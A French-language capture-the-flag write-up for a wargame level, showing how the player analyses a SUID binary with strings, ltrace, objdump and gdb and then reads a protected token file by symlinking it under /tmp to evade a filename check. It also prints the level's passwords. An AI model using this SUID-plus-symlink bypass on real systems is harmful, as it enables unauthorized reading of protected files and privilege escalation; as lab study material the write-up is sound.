LEVEL 08

------------------------------------------------------------------------------------------------------------------------

    find . -user level08 2> /dev/null | grep -v proc
                 flag08
    find . -perm /u=s,g=s 2> /dev/null | grep -v proc
    find . -type f -user flag07 -o -user level08
    find . -maxdepth 1 -name "*string*" -print


* Recherches

    -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
    -rw-------  1 flag08  flag08    26 Mar  5  2016 token

    Binaire SUID et GUID avec extended right via les ACLs

    getfacl level08
        
        Voir le ss- dans man getfacl 

       Indicates  the  setuid (s), setgid (s), and sticky (t) bits: either the letter representing the bit, or else a dash
       (-). This line is included if any of those bits is set and left out otherwise, so it will not be shown for most files.


    file level08    --> RAS
    ldd level08     --> RAS
    strings level08

        %s [file to read]
        token                     --> Potentiellement un des arguments passés à strstr()
        You may not access '%s'
        Unable to open %s
        Unable to read fd %d

    ltrace ./level08
        
            printf("%s [file to read]\n", "./level08"./level08 [file to read]
    
    strace ./level08

            write(1, "./level08 [file to read]\n", 25./level08 [file to read]) = 25

    Le binaire prend un <file to read>

    objdump -d level08 | awk -F"\n" -v RS="\n\n" '$1 ~ /<main>/'


        call   8048420 <printf@plt>
        call   8048460 <exit@plt>

        call   8048400 <strstr@plt>
        call   8048420 <printf@plt>
        call   8048460 <exit@plt>

        8048470 <open@plt>
        call   8048440 <err@plt>
        8048410 <read@plt>
        048490 <write@plt>
        call   8048430 <__stack_chk_fail@plt>

        Anormal le __stack_chk_fail

        https://stackoverflow.com/questions/38418114/why-is-stack-chk-fail-happening-in-my-code

        Answer : One of words exceed MAX_STRING which cause stack overflowed.
                 Stacktrace after crash on __stack_chk_fail only tells you where the problem
                 (stack overflow that smashed the stack) got detected. AddressSanitizer can tell you right when the overflow is happening.

                __stack_chk_fail -- terminate a function in case of stack overflow
                void __stack_chk_fail(void);
                The interface __stack_chk_fail() shall abort the function that called it with a message that a stack overflow has been detected. The program that called the function shall then exit.
                The interface __stack_chk_fail() does not check for a stack overflow itself. It merely reports one when invoked.


    perl -e 'print "A"x100000' > first

    b 37      --> Taille max
    Breakpoint 5 at 0x804868d: file level08.c, line 37.

    En settant des bp avant les call et en affichant les registres, on note qu'edx est set à 400 soit 1024 en décimal
    On constate aussi que c'est la limite du write
    
    perl -e 'print "A"x1000' > /tmp/first ; ./level08 /tmp/first  | wc   # -> Output 1000
    perl -e 'print "A"x1050' > /tmp/first ; ./level08 /tmp/first  | wc   # -> Output 1024 et non 1050

    ---------

    Stop recherches BOF, enfin ne mène à rien car à priori l'objet __stack_chk_fail  traduit l'impossibilité d'exploit via BOF
    Retour à l'idée initiale (skippée sans avoir testé, de fouiner dans les liens symboliques)

    On note un comportement différent quand on passe le fichier token
    Il open/read/write le contenu du fichier passé si celui-ci ne contient pas 'token' dans son nom

        echo pwd > one
        ./level08 /tmp/one
        
        ./level08 token
        
        ./level08 tokden

    Sur le "strings level08", on voit "token", donc à priori c'est le strstr qui l'appelle, et comme il y a pas mal de condition/jump,
    ça peut jusitifer les différences d'output

    Comme en examinant le binaire on ne voit pas d'execv / system, on est quasi sûr que le fichier token contient le flag08


    echo > one
    ./level08 /tmp/one -> semble fonctionner mais est vide

    On peut créer un liens symbolique du fichier token à un "fichier symbolique" dans /tmp
    pour que l'exécutable prenne en fait bien le fichier token

    ln -s $(pwd)/token /tmp/xxx
    ./level08 /tmp/xxx

    Top, ça fonctionne
    Faille apparement bien connue (suid + symlink)

    su flag08 quif5eloekouj29ke0vouxean
    getflag
    su level09 25749xKZ8L7DkSCwJkT9dyv6f 

    Comme on a tjrs accès à tmp/, on peut créer

    



------------------------------------------------------------------------------------------------------------------------


NASM :

    L'instruction TEST :

        CMP subtracts the operands and sets the flags. Namely, it sets the zero flag if the difference is zero (operands are equal).

        TEST sets the zero flag, ZF, when the result of the AND operation is zero. If two operands are equal, their bitwise AND is zero when both are zero.
        TEST also sets the sign flag, SF, when the most significant bit is set in the result, and the parity flag, PF, when the number of set bits is even.

        JE [Jump if Equals] tests the zero flag and jumps if the flag is set. JE is an alias of JZ [Jump if Zero] so the disassembler cannot select one based on the opcode.
        JE is named such because the zero flag is set if the arguments to CMP are equal.

            TEST %eax, %eax
            JE   400e77 <phase_1+0x23>
            jumps if the %eax is zero.

            Équivaut à :

            if (eax == 0) {
                goto some_address
            }

STRSTR :

     If needle is an empty string, haystack is returned; if needle occurs nowhere in haystack, NULL is returned; otherwise a pointer to the first character of
     the first occurrence of needle is returned.

     char * strstr(const char *haystack, const char *needle);

DOCS :

    https://www.exploit-db.com/papers/13199
    https://lwn.net/Articles/250468/